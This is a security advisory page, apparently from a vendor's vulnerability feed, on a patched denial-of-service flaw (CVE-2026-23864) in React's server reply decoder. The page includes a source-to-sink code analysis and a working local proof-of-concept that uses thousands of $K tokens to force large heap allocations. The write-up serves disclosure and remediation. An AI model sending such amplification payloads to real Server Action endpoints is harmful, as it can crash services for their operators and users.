---
schema_version: "1.0.0"
document_id: "1478a848547c611b7d318f0813b21349d9126232ef3e62481b2d43971da796a4"
company_key: "yc-winfunc"
company: "winfunc"
source_id: "yc-winfunc-rss-7ebe4d6da681"
canonical_url: "https://winfunc.com/hacktivity/CVE-2026-23864"
published_at: "2026-01-01T00:00:00+00:00"
first_seen_at: "2026-07-20T23:21:05.938183+00:00"
fetched_at: "2026-07-28T22:24:15.603719+00:00"
content_hash: "sha256:488c1b4cfec209b68f18119aa003f62517b8c886cf4207f4bf819819812d4dd3"
---

# RSC reply decoder DoS via $K FormData amplification (CVE-2026-23864)

[Back to Hacktivity](https://winfunc.com/hacktivity)


### Status: Patched


This vulnerability has been verified as resolved and deployed.


React


High


CVE-2026-23864


2026


# RSC reply decoder DoS via $K FormData amplification (CVE-2026-23864)


## Summary


Unbounded $K expansions allow FormData amplification during RSC reply decoding


The server-side React Flight reply decoder treats` $K<id>` tokens as **nested FormData** and reconstructs them by scanning the backing request form and copying entries into a new` FormData` . Because the decoder performs a full scan and allocation **for every` $K` occurrence** with no global limits, an attacker can embed thousands of` $K` tokens in a small multipart payload and force the server to allocate tens of MB of heap while decoding. This creates a high-amplification DoS that is remotely reachable via Server Actions in frameworks that call` decodeReplyFromBusboy` .


---


**Write-up**


` decodeReply` and` decodeReplyFromBusboy` materialize a response with` _formData` as the backing store, then parse chunk` 0` through` initializeModelChunk` and` reviveModel` . Every string value flows into` parseModelString` , where` $K<id>` is interpreted as a nested FormData.


The` $K` handler builds a **new FormData** and performs a full scan of` _formData` to copy all matching prefixed entries. There is **no validation of the id** , no memoization, and no global limits on` $K` occurrences or copied entries.


As a result, a small multipart payload can include a large array of` $K` tokens and force repeated scans and allocations (CPU O(M * E), memory O(M * N)), amplifying a sub-megabyte request into tens or hundreds of MB of heap usage. This is remotely reachable via Server Actions in frameworks that call` decodeReplyFromBusboy` , making it a practical high-amplification DoS.


### CVSS Score


Vector


N


Complexity


L


Privileges


N


User Interaction


N


Scope


U


Confidentiality


N


Integrity


N


Availability


H


CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H


### Vulnerability Location


Source


Line 1354


packages /react-server


/src


/ReactFlightReplyServer.js


parseModelString ($K case)


Sink


Line 1364


packages /react-server


/src


/ReactFlightReplyServer.js


FormData reconstruction loop


## Source-to-Sink Analysis


1


packages/react-server/src/ReactFlightReplyServer.js:1348-1369


` parseModelString` sees` $K<id>` and constructs a new` FormData` , then scans the entire backing request form for keys with the matching prefix.


JAVASCRIPT


```text
const   formPrefix = response. _prefix   + obj +  '_'  ;
const   data =  new    FormData  ();
backingFormData. forEach  ( ( entry, entryKey  ) =>   {
if   (entryKey. startsWith  (formPrefix)) {
data. append  (entryKey. slice  (formPrefix. length  ), entry);
}
});


```


2


packages/react-server/src/ReactFlightReplyServer.js:1354-1370


Each` $K` token triggers a **full scan** and a **new FormData allocation** , with no cap on occurrences or copied entries.


JAVASCRIPT


```text
return   data;  // New FormData per $K token


```


3


packages/react-server-dom-webpack/src/server/ReactFlightDOMServerNode.js:554-579


` decodeReplyFromBusboy` populates the response by resolving multipart fields, making the` $K` path reachable from HTTP Server Action requests.


JAVASCRIPT


```text
busboyStream. on  ( 'field'  ,  ( name, value  ) =>   {
if   (pendingFiles >  0  ) {
queuedFields. push  (name, value);
}  else   {
resolveField  (response, name, value);
}
});


```


4


packages/react-server/src/ReactFlightReplyServer.js:1485-1502


` resolveField` appends every incoming field into` _formData` , enabling an attacker to control the number and size of entries that are copied per` $K` token.


JAVASCRIPT


```text
response. _formData  . append  (key, value);


```


## Impact Analysis


### Critical Impact


A small (<1 MB) request can force tens to hundreds of MB of allocations while decoding, resulting in memory exhaustion or severe CPU pressure. Repeated requests can crash the server or degrade service availability.


### Attack Surface


Any server that decodes untrusted React Flight reply payloads, including frameworks that use Server Actions / Server Functions with multipart bodies (e.g., Next.js).


### Preconditions


Attacker can send a crafted multipart request to a Server Action endpoint. No authentication is required if the endpoint is publicly reachable.


## Proof of Concept


### Environment Setup


Create a local repro:


BASH


```text
mkdir   rsc-k-dos-repro
cd   rsc-k-dos-repro
npm init -y
npm install  [email protected]


```


### Target Configuration


Save the following as` repro.cjs` :


JS


```text
const   { decodeReply } =  require  ( 'react-server-dom-webpack/server.node'  );


const   N =  200  ;  // number of x_* fields
const   M =  5000  ;  // number of $K expansions


const   form =  new    FormData  ();
for   ( let   i =  0  ; i < N; i++) form. append  ( `x_ ${i}  `  ,  'A'  );


const   inner =  Array  . from  ({  length  : M },  () =>    '"$Kx"'  ). join  ( ','  );
form. append  ( '0'  ,  `[ ${inner}  ]`  );


const   heap0 = process. memoryUsage  (). heapUsed  ;
const   start =  Date  . now  ();


( async   () => {
const   root =  await    decodeReply  (form, {}, {});
const   ms =  Date  . now  () - start;
const   heap1 = process. memoryUsage  (). heapUsed  ;
console  . log  ( 'decoded in'  , ms,  'ms'  );
console  . log  ( 'heap delta MB'  , ((heap1 - heap0) / ( 1024  * 1024  )). toFixed  ( 1  ));
console  . log  ( 'root len'  , root. length  );
})();


```


### Exploit Delivery


Run the PoC:


BASH


```text
node --conditions=react-server repro.cjs


```


### Outcome


The decoder allocates thousands of new` FormData` objects and copies entries on each` $K` , producing large heap growth from a small input.


**Expected Response:**


TEXT


```text
decoded in <time> ms
heap delta MB <tens of MB>
root len 5000


```


## Run this level of analysis on your repo.


Winfunc traces source-to-sink paths, validates exploitability, and gives your team patch-ready remediation.


[Vulnerability Detection](https://winfunc.com/products/scanner/vulnerability-detection)


[View Patch PR Verify fix on GitHub](https://github.com/facebook/react/commit/63d61c755795eb32e7cc0241d94abbf41cdef8c9)
